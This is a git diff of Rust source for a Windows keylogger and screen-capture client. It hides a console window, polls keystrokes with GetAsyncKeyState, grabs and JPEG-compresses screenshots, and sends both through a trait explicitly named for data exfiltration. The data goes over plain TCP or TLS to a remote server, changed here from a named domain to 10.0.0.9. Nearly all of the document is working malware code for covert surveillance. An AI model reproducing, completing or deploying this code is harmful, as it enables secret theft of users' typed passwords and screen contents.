@@ -12,153 +12,188 @@ use std::time::Duration;
 use std::net::{SocketAddr, TcpStream};
 use mozjpeg::{ColorSpace, Compress};
 use openssl::ssl::{SslMethod, SslConnector, SslStream};
-// remember $Env:OPENSSL_DIR='C:\Program Files\OpenSSL-Win64' !!!
-// and you need OpenSSL libraries installed as well to build for Win64
 use crate::pool::Pool;
+// remember $Env:OPENSSL_DIR='C:\Program Files\OpenSSL-Win64'!!!
+// and you need OpenSSL libraries installed as well to build for Win64
 
-const REMOTE_DOMAIN: &str = "revy.johnroark.us";
+const REMOTE_DOMAIN: &str = "10.0.0.9";
 const SIGNAL_SIZE: usize = 4;
+// TCP SYN: | compression_quality (4) | frame_time_ms(4) | size = 8
+const SYN_SIZE: usize = 8;
 const REMOTE_PORT: i32 = 443;
-const FRAME_TIME: u128 = 2000;
 enum TcpData {Keys(Vec<u8>), Screenshot(Vec<u8>)}
+
 #[derive(Copy, Clone)]
-enum TcpSignalClient {
-    StartSendKeys = 1,
-    EndSendKeys,
+#[allow(unused_variables)]
+pub enum TcpSignalClient {
+    ClientSyn = 1,
+    ClientAck,
+    ClientErr,
+    ClientStop,
+    StartSendKeys,
     StartSendScreen,
-    EndSendScreen,
     StartSendMeta,
-    EndSendMeta
 }
 
-pub struct TLSSocketClient { sock: SslStream<TcpStream> } 
+pub struct TCPSocketClient { 
+    sock: TcpStream,
+    pub frame_time: u128,
+    compression_quality: f32
+}
 
-impl TLSSocketClient {
+fn build_from_init(buf: Vec<u8>) -> (i32, i32) {
+    assert!(buf.len() == SYN_SIZE);
+    println!("{:?}", buf);
+    let mut frame_arr = [0u8; 4];
+    let mut comp_arr = [0u8; 4];
+    frame_arr[0] = buf[0]; frame_arr[1] = buf[1];
+    frame_arr[2] = buf[2]; frame_arr[3] = buf[3];
+    comp_arr[0] = buf[4]; comp_arr[1] = buf[5];
+    comp_arr[2] = buf[6]; comp_arr[3] = buf[7];
+    println!("{:?} : {:?} -> {} , {}", 
+        frame_arr, comp_arr,
+        i32::from_be_bytes(frame_arr),
+        i32::from_be_bytes(comp_arr)
+    );
+    (i32::from_be_bytes(frame_arr), i32::from_be_bytes(comp_arr))
+}
 
-    pub fn init() -> TLSSocketClient {
-        let connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
-        let stream = TcpStream::connect(
-            format!("{}:{}", REMOTE_DOMAIN, REMOTE_PORT)
-        ).unwrap();
-        let mut stream = connector.connect(REMOTE_DOMAIN, stream).unwrap();
-        TLSSocketClient { sock: stream }
-    }
-    
-    pub fn send(&mut self, signal: TcpSignalClient, data: Option<Vec<u8>>) {
-        let mut res = [0u8; SIGNAL_SIZE];
+// trait for data exfiltration (tcp / tls)
+pub trait Exfil {
+    fn send(&mut self, signal: TcpSignalClient, data: Option<Vec<u8>>) {
         match signal {
             TcpSignalClient::StartSendKeys => {
                 println!("Sending keys <3");
-                self.send_on_ack(&signal, 1, data.unwrap_or(Vec::new()));
-            },
-            TcpSignalClient::EndSendKeys => {
-                self.sock.write(&2i32.to_be_bytes()); 
+                self.send_on_ack(&signal, 5, data.unwrap_or(Vec::new()));
             },
             TcpSignalClient::StartSendScreen => {
                 println!("Sending screenshot <3");
-                self.send_on_ack(&signal, 2, data.unwrap_or(Vec::new()));
-            },
-            TcpSignalClient::EndSendScreen => {
-                self.sock.write(&4i32.to_be_bytes());
+                self.send_on_ack(&signal, 6, data.unwrap_or(Vec::new()));
             },
             _ => {}
-        }
-    }
-
-    fn send_on_ack(&mut self, signal: &TcpSignalClient, ack: i32, data: Vec<u8>) {
-        let mut res = vec![0u8; SIGNAL_SIZE];
-        let sig_int = *signal as u8;
-        self.sock.write(&sig_int.to_be_bytes());
-        self.sock.read_to_end(&mut res).unwrap();
-        if i32::from_be_bytes(build_sig_array(res)) == ack {
-            self.sock.write(&data).unwrap(); 
-        }
-    }
-
-}
-
-fn build_sig_array(sig: Vec<u8>) -> [u8; 4] {
-    assert!(sig.len() == 4);
-    let mut res = [0u8; 4];
-    unsafe {
-        // this is still safe anyway dw :)
-        res[0] = sig[0]; res[1] = sig[1]; res[2] = sig[2]; res[3] = res[3]
-    }
-    res
-}
-
-pub fn grab_multiple(amt: usize, socket: &mut TLSSocketClient) {
-    let one_second = Duration::new(1, 0);
-    let one_frame = one_second / 60;
-    let pool = Pool::new(amt);
-    let display = Display::primary().expect("Couldn't find primary display.");
-    let mut capturer = Capturer::new(display).expect("Couldn't begin capture.");
-    let (w, h) = (capturer.width(), capturer.height());
-    loop {
-        let (key_sender, receiver) = channel();
-        let scr_sender = key_sender.clone();
-        pool.execute(move || {
-            let now = std::time::SystemTime::now();
-            let mut keystrokes = Vec::new();
-            loop {
-                match now.elapsed().unwrap().as_millis() >= FRAME_TIME {
-                    true => {
-                        key_sender.send(TcpData::Keys(keystrokes)).unwrap();
-                        keystrokes = Vec::new();
-                    },
-                    false => gather_keystrokes(&mut keystrokes)
-                }
-            }
-        });
-        let frame = {
-            loop {
-                match capturer.frame() {
-                    Ok(buffer) => break buffer.to_vec(),
-                    Err(error) => {
-                        if error.kind() == WouldBlock {
-                            thread::sleep(one_frame);
-                            continue;
-                        } else {
-                            panic!("Error: {}", error);
-                        }
-                    }   
-                }
-            }
         };
-        pool.execute(move || {
-            match encode(frame, w, h) {
-                Some(scr) => scr_sender.send(TcpData::Screenshot(scr)).unwrap(),
-                None => {}
-            }
-        });
-        for _ in 0..2 {
-            match receiver.recv() {
-                Ok(data) => match data{
-                    TcpData::Keys(keys) => {
-                        socket.send(TcpSignalClient::StartSendKeys, Some(keys))
-                    },
-                    TcpData::Screenshot(scr) => {
-                    },
-                },
-                Err(_) => {}
+    }
+    fn send_on_ack(&mut self, signal: &TcpSignalClient, ack: i32, data: Vec<u8>);
+    fn frame_time(&self) -> u128;
+    fn comp_quality(&self) -> f32;
+}
+
+// unencrypted TCP streaming
+impl TCPSocketClient {
+    pub fn init() -> TCPSocketClient {
+        let mut nossl_stream = TcpStream::connect(
+            format!("{}:{}", REMOTE_DOMAIN, REMOTE_PORT)
+        ).unwrap();
+        let mut buf = vec![0u8; SYN_SIZE];
+        nossl_stream.write(&1i32.to_be_bytes()).unwrap();
+        nossl_stream.read(&mut buf).unwrap();
+        let (frame_time_ms, compression_quality) = build_from_init(buf);
+        match frame_time_ms != 0 && compression_quality != 0 {
+            true => {
+                nossl_stream.write(&2i32.to_be_bytes()).unwrap();
+                return TCPSocketClient{
+                    sock: nossl_stream,
+                    frame_time: frame_time_ms as u128,
+                    compression_quality: compression_quality as f32
+                }
+            },
+            false => {
+                nossl_stream.write(&3i32.to_be_bytes()).unwrap();
+                panic!("Unable to initialize!");
             }
         }
     }
+}
+
+impl Exfil for TCPSocketClient {
+    fn send_on_ack(&mut self, signal: &TcpSignalClient, ack: i32, data: Vec<u8>) {
+        let mut res = [0u8; SIGNAL_SIZE];
+        let sig_int = *signal as u8;
+        let sig_out = *&sig_int as i32;
+        self.sock
+            .write(&sig_out.to_be_bytes())
+            .unwrap();
+        self.sock
+            .read(&mut res)
+            .unwrap();
+        if i32::from_be_bytes(res) == ack {
+            println!("Writing {:?}b", data.len());
+            self.sock.write(&data).unwrap();
+        }
+    }
+    fn frame_time(&self) -> u128 { self.frame_time }
+    fn comp_quality(&self) -> f32 { self.compression_quality }
+}
+
+pub struct TLSSocketClient { 
+    sock: SslStream<TcpStream>,
+    pub frame_time: u128,
+    compression_quality: f32
+}
+
+// encrypted TLS/TCP streaming
+impl TLSSocketClient {
+    pub fn init() -> TLSSocketClient {
+        let connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
+        let ssl_stream = TcpStream::connect(
+            format!("{}:{}", REMOTE_DOMAIN, REMOTE_PORT)
+        ).unwrap();
+        let mut ssl_stream = connector.connect(REMOTE_DOMAIN, ssl_stream).unwrap();
+        let mut buf = vec![0u8; SYN_SIZE];
+        ssl_stream.write(&1i32.to_be_bytes()).unwrap();
+        ssl_stream.read(&mut buf).unwrap();
+        let (frame_time_ms, compression_quality) = build_from_init(buf);
+        match frame_time_ms != 0 && compression_quality != 0 {
+            true => {
+                ssl_stream.write(&2i32.to_be_bytes()).unwrap();
+                return TLSSocketClient{
+                    sock: ssl_stream,
+                    frame_time: frame_time_ms as u128,
+                    compression_quality: compression_quality as f32
+                }
+            },
+            false => {
+                ssl_stream.write(&3i32.to_be_bytes()).unwrap();
+                panic!("Unable to initialize!");
+            }
+        }
+    }
+
+}
+
+impl Exfil for TLSSocketClient {
+    fn send_on_ack(&mut self, signal: &TcpSignalClient, ack: i32, data: Vec<u8>) {
+        let mut res = [0u8; SIGNAL_SIZE];
+        let sig_int = *signal as u8;
+        self.sock
+            .ssl_write(&sig_int.to_be_bytes())
+            .unwrap();
+        self.sock
+            .ssl_read(&mut res)
+            .unwrap();
+        if i32::from_be_bytes(res) == ack {
+            self.sock
+                .ssl_write(&data)
+                .unwrap(); 
+        }
+    }
+    fn frame_time(&self) -> u128 { self.frame_time }
+    fn comp_quality(&self) -> f32 { self.compression_quality }
 }
 
 fn gather_keystrokes(keystrokes: &mut Vec<u8>) {
     // spawns a new windows (((console))) with IO inputs
-	let window_sink: winapi::HWND;
-	unsafe {
-		kernel32::AllocConsole();
-		window_sink = user32::FindWindowA(
+    let window_sink: winapi::HWND;
+    unsafe {
+        kernel32::AllocConsole();
+        window_sink = user32::FindWindowA(
             std::ffi::CString::new("ConsoleWindowClass")
                 .unwrap()
                 .as_ptr(),
             std::ptr::null()
         );
-		user32::ShowWindow(window_sink,0);
-	};
+        user32::ShowWindow(window_sink,0);
+    };
     for i in 8..190 {
         if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
             // read the inputs into the (((console)))
@@ -184,10 +219,93 @@ fn gather_keystrokes(keystrokes: &mut Vec<u8>) {
     };
 }
 
-fn encode(frame: Vec<u8>, w: usize, h: usize) -> Option<Vec<u8>> {
+pub fn grab_multiple<T>(pool: &mut Pool, socket: &mut T)
+where T: Exfil
+{
+    let one_frame = Duration::new(1, 0) / 60;
+    let display = Display::primary().expect("Couldn't find primary display.");
+    let mut capturer = Capturer::new(display).expect("Couldn't begin capture.");
+    let (w, h) = (capturer.width(), capturer.height());
+    let comp_quality = socket.comp_quality();
+    let time = socket.frame_time();
+    loop {
+        let (key_sender, receiver) = channel();
+        let scr_sender = key_sender.clone();
+        let master_now = std::time::SystemTime::now();
+        let thread_now = master_now.clone();
+        pool.execute(move || {
+            let mut keystrokes = Vec::new();
+            loop {
+                match thread_now.elapsed().unwrap().as_millis() >= time {
+                    true => {
+                        match key_sender.send(TcpData::Keys(keystrokes)) {
+                            Ok(_) => break,
+                            Err(_) => break // main thread stopped listening
+                        }
+                    },
+                    false => gather_keystrokes(&mut keystrokes)
+                }
+            }
+        });
+        let frame = {
+            loop {
+                match capturer.frame() {
+                    Ok(buffer) => break buffer.to_vec(),
+                    Err(error) => {
+                        if error.kind() == WouldBlock {
+                            thread::sleep(one_frame);
+                            continue;
+                        } else {
+                            panic!("Error: {}", error);
+                        }
+                    }   
+                }
+            }
+        };
+        pool.execute(move || {
+            match encode(frame, w, h, comp_quality) {
+                Some(scr) => scr_sender.send(TcpData::Screenshot(scr)).unwrap(),
+                None => {}
+            }
+        });
+        loop {
+            match master_now
+                .elapsed()
+                .unwrap()
+                .as_millis() >= socket.frame_time() 
+            {
+                true => {
+                    for _ in 0..2 {
+                        // 1 thread for keylogging 1 thread for screenshot compression
+                        match receiver.recv() {
+                            Ok(data) => match data{
+                                TcpData::Keys(keys) => {
+                                    socket.send(
+                                        TcpSignalClient::StartSendKeys,
+                                        Some(keys)
+                                    )
+                                },
+                                TcpData::Screenshot(scr) => {
+                                    socket.send(
+                                        TcpSignalClient::StartSendScreen,
+                                        Some(scr)
+                                    )
+                                },
+                            },
+                            Err(_) => {}
+                        }
+                    }
+                },
+                false => {}
+            }
+        }
+    }
+}
+
+fn encode(frame: Vec<u8>, w: usize, h: usize, comp: f32) -> Option<Vec<u8>> {
     let mut jpeg = Compress::new(ColorSpace::JCS_EXT_BGRA);
     jpeg.set_size(w, h);
-    jpeg.set_quality(44.0);
+    jpeg.set_quality(comp);
     jpeg.set_mem_dest();
     jpeg.start_compress();
     match jpeg.write_scanlines(&frame) {
